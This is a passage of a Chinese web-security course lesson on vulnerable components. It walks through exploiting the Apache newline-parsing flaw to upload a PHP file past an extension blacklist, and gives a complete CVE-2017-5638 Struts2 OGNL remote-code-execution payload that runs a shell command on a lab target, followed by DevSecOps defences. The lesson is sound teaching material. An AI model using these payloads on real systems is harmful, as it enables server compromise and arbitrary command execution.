<pre><code class="language-php">if(in_array($ext, ['php', 'php3', 'php4', 'php5', 'phtml', 'pht'])) {
        exit('bad file');
    }
</code></pre>

<p>它是基于黑名单的过滤方式，所以我们无法直接上传php相关后缀的文件名。但是，我们可以尝试利用换行解析漏洞去进行测试。于是，我们开启BurpSuite，拦截文件上传的报文如下：</p>

<pre><code class="language-plain">POST /index.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 298
Cache-Control: max-age=0
sec-ch-ua: &quot;Chromium&quot;;v=&quot;95&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;macOS&quot;
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryD5b4HReBGGEbOB2B
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

------WebKitFormBoundaryD5b4HReBGGEbOB2B
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;
Content-Type: text/php

&lt;?php phpinfo();?&gt;

------WebKitFormBoundaryD5b4HReBGGEbOB2B
Content-Disposition: form-data; name=&quot;name&quot;

test.php
------WebKitFormBoundaryD5b4HReBGGEbOB2B--
</code></pre>

<p>在倒数第二行test.php的最后加上一个空格符，然后点击Hex格式，找到我们刚刚输入的空格，将它改为0a。</p>

<p><img src="assets/b372f02e2d3a4e468d70700e492b69a9.jpg" alt="图片" /></p>

<p>然后将这个修改后的报文发送出去，响应中不再提示bad file。然后我们访问test.php%0a路径，获得响应如下：</p>

<p><img src="assets/58e9f0cb415c4c8c9585be05c6322023.jpg" alt="图片" /></p>

<p>可以看到，我们上传文件test.php成功，并且成功输出了其中的PHP语句，我们看到Apache的版本信息为2.4.10，<strong>确实是存在换行解析漏洞的版本</strong>。</p>

<p>回顾我们的攻击过程，我们将文件的后缀改为了 .php%0a，这个后缀是可以通过检测的，因此Web应用会允许 test.php%0a 的上传。到这里都是合理的，可是问题就发生在Apache在解析这个文件时，会将它解析为一个PHP文件，并调用PHP解释器来执行它。</p>

<p>事实上，%0a 代表换行符。Apache 是使用 .php<span class="math inline">\( 的正则匹配方式来检测 php 后缀的文件，而 \)</span> 是匹配字符串中结尾的位置，且如果存在换行符，则匹配换行符为结尾。所以，在上述示例中，我们利用了换行符 %0a 与 $ 匹配，使得<strong>我们上传的文件test.php%0a被当作PHP文件解析</strong>。</p>

<p>这就是Apache换行解析漏洞，它的危害性还是很大的，所以我们在开发Web应用时，需要避免使用漏洞存在的版本。</p>

<p>接下来，让我们学习另一个典型的不安全组件问题，即Struts2远程代码执行漏洞。</p>

<h3 id="struts2远程代码执行漏洞">Struts2远程代码执行漏洞</h3>

<p>在学习这个漏洞之前，我们先来看下Struts2是什么。</p>

<p>Struts2是一个Java Web应用框架，它可以帮助我们更容易地去构建一个Web应用。在简单地了解了Struts2之后，我们开始学习Struts2远程代码执行漏洞产生的原理。</p>

<p>事实上，<strong>Struts2漏洞发生在文件上传过程中</strong>，我们知道上传和下载在Web应用中属于常用功能，可是Struts2本身并没有提供这个功能，而是选择调用模块Jakarta来实现文件的上传。这个Jakarta在处理文件上传请求时，会对异常信息进行OGNL表达式解析处理，这就是导致漏洞产生的核心因素。</p>

<p>攻击者可以访问使用Struts2制作的Web应用，并且用BurpSuite捕获报文，将HTTP请求头中的Content-Type改为包含multipart/form-data的OGNL恶意命令。这样Struts2在接收到这个请求后，由于Content-Type的值包含multipart/form-data，所以认为这是一个文件上传请求，进而交给Jakarta进行处理。可是我们的Content-Type中包含了恶意的OGNL代码，导致Jakarta在处理它时会发现异常，并将异常信息交给OGNL表达式解析处理。这样，我们的恶意OGNL代码就会被执行。</p>

<p>这就是Struts2远程代码执行漏洞，该漏洞被称为CVE-2017-5638，它的影响版本为Struts 2.3.5 - Struts 2.3.31以及Struts 2.5 - Struts 2.5.10。接下来，让我们通过实战，来亲自体会它的威力吧！</p>

<h2 id="实战演练">实战演练</h2>

<p>我们进入实战环节，登录谜团（mituan.zone）并选择【易受攻击和过时的组件CVE-2017-5638】靶机，如果你可以看到如下页面，那就成功打开了我们的靶场。</p>

<p><img src="assets/4a96d10dbc7c422d9e4678ac04803a0d.jpg" alt="图片" /></p>

<p>接下来我们刷新页面，用BurpSuite拦截请求，获取到如下报文：</p>

<pre><code class="language-plain">GET /showcase.action HTTP/1.1
Host: 127.0.0.1:8080
sec-ch-ua: &quot;Chromium&quot;;v=&quot;95&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;macOS&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
</code></pre>

<p>下面，我们给它添加一个Content-Type请求头，并将包含multipart/form-data字符串的恶意payload作为它的值。</p>

<pre><code class="language-plain">GET /showcase.action HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
sec-ch-ua: &quot;Chromium&quot;;v=&quot;95&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: &quot;macOS&quot;
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Content-Type: 
%{(#_='multipart/form-data').(#<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="a7c3ca9ae7c8c0c9cb89e8c0c9cbe4c8c9d3c2dfd3">[email&#160;protected]</a>@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls -l').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=C7D2C0C8353A3D952C576487D42216E3
Connection: close
</code></pre>

<p>payload是一段OGNL语句，你可能看不懂它，不用担心，这里我们只需要知道，<strong>在payload中cmd的值指定为</strong> <code>ls -l</code>，这样就可以让Web应用执行 <code>ls -l</code> 命令，并将输出进行返回。将我们精心修改后的报文发送出去，你就可以看到页面响应内容变为如下：</p>

<p><img src="assets/4481864615c84004aaf23a37124de5ee.jpg" alt="图片" /></p>

<p>可以看到，我们注入的命令 <code>ls -l</code> 的结果已经返回在页面上，攻击成功。</p>

<p>到这里，你已经学习了易受攻击和过时组件会给Web应用造成的威胁，接下来我们来学习如何抵御组件不安全的问题。</p>

<h2 id="防御方式">防御方式</h2>

<p>为了保证我们的Web应用不会因为组件问题，导致威胁的存在，我们需要了解开发的Web应用中所有的组件信息，然后对它们进行检查，判断其中是否有不安全的组件存在，如果存在就对它们进行限制或修改，解决安全隐患，同时持续关注这些组件的安全信息。</p>

<p>这样我们就可以尽可能地减少组件安全性问题发生的概率。不过，上述措施实施起来还是比较困难的，毕竟一个Web应用可能会用到很多的组件。为了解决这个问题，我们可以利用DevSecOps来开发我们的应用。下面，我们来学习DevSecOps是什么以及它是如何保护Web应用组件安全的。</p>

<h3 id="devsecops">DevSecOps</h3>

<p>想要学习DevSecOps，我们首先要了解DevOps是什么。</p>

<p>DevOps即有质量保证的开发与运维，它代表的是一组过程、方法与系统的统称，用于促进开发、技术运营以及质量保障部门之间的沟通、协作与调整。</p>

<p>在DevOps模式下，运维人员会在项目开发期就介入到开发过程中，了解开发人员使用的系统架构和技术路线，从而制定适当的运维方案。而开发人员也会在运维的初期参与到系统部署中，并提供系统部署的优化建议。这样不仅可以加深开发人员和运维人员的感情，还能使得彼此更了解应用的整体情况，有助于提高实施效率。</p>

<p>DevSecOps相比较而言多了Sec三个字母，事实上，<strong>它确实就是将安全性无缝集成到DevOps的每个阶段</strong>。它统一了开发活动、操作支持和安全检查。在DevSecOps中，对代码的任何更改都会触发安全检查，其中若存在易受攻击和不安全的组件，就会很快被发现及更改。</p>

<p><img src="assets/f67c7e9545d947c186a9e25104946c35.jpg" alt="图片" /></p>

<h2 id="总结">总结</h2>

<p>在这节课程中，我们学习了易受攻击和过时的组件问题。</p>

<p>首先，我们对组件进行了理解，知道了它其实是一个灵活的概念，我们可以将它理解为独立的功能单元。</p>

<p>之后，我们通过对Struts以及Apache这两个组件安全性的分析，结合实战，切身地了解了不安全的组件会给我们整个Web应用的安全性造成极大的威胁。</p>

<p>最后，我们学习了如何抵御组件安全性问题，即通过DevSecOps方式开发我们的Web应用，对所用的组件及依赖项进行及时的检测。这样，就可以很好地保护我们的Web应用啦！</p>

<h2 id="思考题">思考题</h2>

<p>你还知道哪些组件安全问题吗？以及如何防御？</p>

<p>欢迎在评论区中分享。如果觉得今天的内容对你有所帮助的话，也欢迎你把课程分享给其他同事或朋友，我们共同学习进步！</p>
</div>
                        </div>
                        <div>
                            <div id="prePage" style="float: left">

                            </div>
                            <div id="nextPage" style="float: right">

                            </div>
                        </div>

                    </div>
                </div>
            </div>
            <div class="copyright">
                <hr />
                <p>© 2019 - 2023 <a href="/cdn-cgi/l/email-protection#305c5c5c09040101000770575d51595c1e535f5d" target="_blank">Liangliang Lee</a>.
                    Powered by <a href="https://github.com/gin-gonic/gin" target="_blank">gin</a> and <a
                        href="https://github.com/kaiiiz/hexo-theme-book" target="_blank">hexo-theme-book</a>.</p>
            </div>
        </div>
        <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
    </div>
<script data-cfasync="false" src="/static/email-decode.min.js"></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8f12c5486b0963f7',t:'MTczNDA1OTUyNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/static/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body>

<script async src="https://www.googletagmanager.com/gtag/js?id=G-NPSEEVD756"></script>

<script src="/static/index.js"></script>

</html>